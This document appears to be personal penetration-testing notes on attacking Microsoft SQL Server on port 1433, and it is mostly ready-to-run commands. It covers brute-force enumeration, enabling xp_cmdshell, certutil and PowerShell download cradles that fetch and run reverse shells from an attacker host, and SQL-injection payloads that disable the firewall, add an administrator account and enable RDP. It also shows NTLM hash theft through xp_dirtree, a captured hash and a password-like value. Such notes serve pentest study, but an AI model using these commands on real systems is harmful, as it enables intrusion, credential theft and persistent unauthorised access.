#### Quick Enuemration
```bash - kali
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $TARGET
```

```bash - kali
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts $TARGET
```

#### Connect with mssql-shell.rb  - 404 page
```bash - kali
wget https://raw.githubusercontent.com/dr0pb3ar/mssql-shell/master/mssql-shell.rb
```

```bash - kali
sudo gem install tiny_tds colorize
```

```bash - kali
sudo apt install freetds-dev
```

```bash - kali
chmod +x mssql-shell.rb
```

```bash - kali
sudo ./mssql-shell.rb -u $USER -p $PASSWORD $TARGET
```

```bash - kali
select @@version;
```

```bash - kali
:xp_cmdshell whoami
```

If this errors, just follow [[Port 1433 - MSSQL ~#sp_cmdshell]] or [[Port 1433 - MSSQL ~#xp_cmdshell]] to enable the feature.

[[1._Reverse Shells (WIN)]]

[[Python#Server]]

[[4._File Transfers]]

```bash - kali
:xp_cmdshell certutil -urlcache -split -f http://$KALI/reverse.exe 
```

[[rlwrap]]

```bash - kali
:xp_cmdshell reverse.exe 
```

#### Connect with mssql_shell.py - BROKEN?
```bash - kali
wget https://raw.githubusercontent.com/Alamot/code-snippets/master/mssql/mssql_shell.py
```

Input Target IP, username and password.

```bash - kali
python mssql_shell.py
```

#### Connect with MSSQLClient 
```bash - kali
mssqlclient.py $HOSTNAME$/$USER:'$PASSWORD'@$TARGET -windows-auth
```

#### Connect with sqsh

```bash - kali
sqsh -S $TARGET:1433 -U sa
```

```bash - kali
RPSsql12345
```

#### sp_cmdshell

You may have to enter "go" after every command!

![[Pasted image 20220408112248.png]]

```SQL
sp_configure 'show advanced options', '1'
```

```SQL
RECONFIGURE
```

```SQL
sp_configure 'xp_cmdshell', '1'
```

```SQL
RECONFIGURE
```

```SQL
EXEC master..xp_cmdshell 'whoami'
```

[[1._Reverse Shells (WIN)#Invoke-Powershell ps1]]

[[rlwrap]]

```SQL
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://$KALI/Invoke-PowerShellTcp.ps1") | powershell -noprofile'
```

#### xp_cmdshell
```SQL
enable_xp_cmdshell
```

```SQL
go
```

```SQL
xp_cmdshell 'date'
```

```SQL
 go
```

```SQL
xp_cmdshell whoami
```

```SQL
go
```

#### Powershell reverse shell
```python - kali
sudo python3 -m http.server 80
```

[[Python#Server]]

[[rlwrap]]

[[1._Reverse Shells (WIN)#Powershell reverse TCP]]

```SQL
xp_cmdshell "powershell IEX(New-Object Net.WebClient).DownloadString('http://$KALI:80/powershell_reverse_tcp.ps1') | powershell -noprofile -"
```

```SQL
go
```

Python:
```SQL
EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")'
```

[https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)

#### xp_cmdshell RDP
```SQL
' UNION ALL SELECT 1,2--
```
  
```SQL
' UNION ALL SELECT @@version,2--
```

```SQL
' union select @@version,2; WAITFOR DELAY '0:0:5' ; --
```
   
```SQL
' union select @@version,2; EXEC sp_configure 'show advanced options', 1; WAITFOR DELAY '0:0:5' ; --
```

```SQL
' union select @@version,2; RECONFIGURE; --
```

```SQL
' union select @@version,2; EXEC sp_configure 'xp_cmdshell', 1; --
```

```SQL
' union select @@version,2; RECONFIGURE; --
```

```SQL
' union select @@version,2; exec master..xp_cmdshell 'ping localhost'; --
```

```SQL
' union select @@version,2; exec master..xp_cmdshell 'dir c:'; --
```

```SQL
' union select @@version,2; exec master..xp_cmdshell 'netsh advfirewall set allprofiles state off'; --
```

```SQL
' union select @@version,2; exec master..xp_cmdshell 'net user foobar Password123 /add'; --
```

```SQL
' union select @@version,2; exec master..xp_cmdshell 'net localgroup Administrators foobar /add'; --
```

```bash
rdesktop -a 16 -z -u foobar -p Password123 $TARGET
```

RDP was already enabled in the above example. If disabled, we can try enabling RDP with:

```SQL
' union select user,null; exec master..xp_cmdshell ''reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f''; --
```

#### Enumeration
```SQL
select @@version;
```

```SQL
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

```SQL
SELECT name FROM master.sys.databases
```

```SQL
use volume
```

#### Steal NTLM hash
```bash - kali
mkdir share
```

```bash - kali
smbserver.py -smb2support share share/
```

```bash - kali
exec master..xp_dirtree '\\$KALI\share\',1,1 
```

`mssql-svc::$HOSTNAME:4141414141414141:fcf5ce3bc7c6f2d4cc186363f57a4afb:0101000000000000805cb28d9e1fd801cfdf67806cdb917000000000010010006e006b006f004f006c0070006b0049000200100061006800630076007a00630045005900030010006e006b006f004f006c0070006b0049000400100061006800630076007a0063004500590007000800805cb28d9e1fd80106000400020000000800300030000000000000000000000000300000bdca754ed8e5710ee15f0f7d0238f5927e0ad033b727c638d8831685eafab2d20a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000`

![[Hashcat#NetNTLMv2]]

#### Getting hashes with tftp

Using [[Abbreviated dir]]'s, we put together the path
`C:\PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\DATA\master.mdf`

However, we cannot read from there, so we aim to the backup folder:
`"C:\PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf" $TARGET`

[[Port 69 - TFTP#tftp py]]

```bash - kali
git clone https://github.com/xpn/Powershell-PostExploitation && cd Powershell-PostExploitation/ && cd Invoke-MDFHashes
```

Load PowerShell in Kali:
```bash - kali
pwsh
```

```PowerShell - kali
Import-Module ./Get-MDFHashes.ps1
```

```PowerShell - kali
Add-Type -Path /home/kali/Desktop/$TARGET/Powershell-PostExploitation/Invoke-MDFHashes/OrcaMDF.Framework.dll
```

```PowerShell - kali
Add-Type -Path /home/kali/Desktop/$TARGET/Powershell-PostExploitation/Invoke-MDFHashes/OrcaMDF.RawCore.dll  
```

* Be sure to widen you terminal to see the whole hash!

```PowerShell - kali
Get-MDFHashes -mdf /home/kali/Desktop/$TARGET/master.mdf
```

